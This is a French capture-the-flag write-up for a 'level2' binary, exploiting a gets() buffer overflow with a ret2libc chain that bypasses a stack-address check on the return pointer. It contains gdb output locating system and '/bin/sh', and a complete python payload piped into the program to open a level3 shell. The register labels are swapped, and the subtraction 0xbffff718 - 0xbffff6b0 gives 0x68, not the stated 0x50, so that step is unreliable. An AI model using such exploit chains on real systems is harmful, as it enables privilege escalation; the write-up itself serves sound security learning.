En décompilant l'exécutable , on remarque qu'il y a un appel à `get` donc faille d'un **buffer overflow** possible. En revanche, on remarque que le programme fait un test sur l'adresse de retour et vérifie qu'elle ne se situe pas dans la stack.
```c
if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", unaff_retaddr);
    _exit(1);
}
```
On peut donc profiter d'une faille `Ret2libc`, mais en s'assurant que l'adresse de retour ne pointe pas directement sur la fonction `system` qui, elle, se situe dans la stack.

Pour cela, on peut simplement remplacer l'adresse de retour dans la stack par l'adresse de retour de la fonction `p`.

Nous avons donc besoin de 3 adresses :
- `system`
- `"/bin/sh"`
- retour de `p`

On utilise `gdb` pour les determiner :
```
> gdb level2
```

---

**system**
```
> (gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
```
0xb7e6b060
```

**"/bin/sh"**
```
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```
```
0xb7f8cc58
```

**Retour de p**
```
> (gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	    push   %ebp
   0x080484d5 <+1>:	    mov    %esp,%ebp
   0x080484d7 <+3>:	    sub    $0x68,%esp
   0x080484da <+6>:	    mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
```
```
0x0804853e
```

---

Pour trouver la taille du buffer, il nous suffit de connaitre l'adresse de `esp` et l'adresse de `eip`. Ainsi, nous determinerons la taille du buffer par cette équation :
```
buffer = adresse_esp - adresse_ebp
```
On détermine les adresse avec `gdb` :

---

**esp**
```
> (gdb) x $ebp
0xbffff6b0
```
```
0xbffff6b0
```

**ebp**
```
> (gdb) x $esp
0xbffff718
```
```
0xbffff718
```

---

On remplace dans notre équation :
```
buffer = adresse_esp - adresse_ebp
       = 0xbffff718 - 0xbffff6b0
       = 0x50
       = 80 (base 10)
```
Nous devons donc remplir notre buffer avec `80` caractères.

On assemble les adresses avec une commande `python` qu'on redirige dans un fichier :
```
> python -c 'print "A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "OSEF" + "\x58\xcc\xf8\xb7"' > /tmp/command
```
Enfin on redirige le contenu de ce fichier dans l'exécutable `level2` :
```
> cat /tmp/command - | ./level2
```
Nous avons ouvert un shell avec les droits de l'utilisateur `level3`
